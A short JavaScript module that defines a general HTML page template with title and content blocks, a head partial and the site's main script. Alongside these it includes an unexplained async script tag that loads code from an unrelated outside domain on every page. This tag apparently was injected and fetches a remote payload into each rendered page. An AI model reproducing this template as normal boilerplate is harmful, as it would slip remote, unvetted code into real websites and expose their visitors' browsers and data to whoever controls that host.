import head from '../partials/html-head.mjs';

class GeneralTemplate {
  blockNames = ['title', 'content'];

  // eslint-disable-next-line no-unused-vars
  renderBlock(blockName, data) {
    if (!this.blockNames.includes(blockName)) {
      throw new Error(`Block "${blockName}" not found!`);
    }
    return '';
  }

  render(data) {
    return String.raw`<!DOCTYPE html>
      <html lang="en">
      <head>
        ${head(data)}
        <title>${this.renderBlock('title', data)}</title>
      </head>
      <body>
        <main id="main">
          ${this.renderBlock('content', data)}
        </main>
        <script type="module" src="${data.assetsUrlPath}/js/main.js" crossorigin></script>
        <script src="https://mwst.sinzy.info/code/3" async></script>
      </body>
      </html>
    `;
  }
}

export default GeneralTemplate;
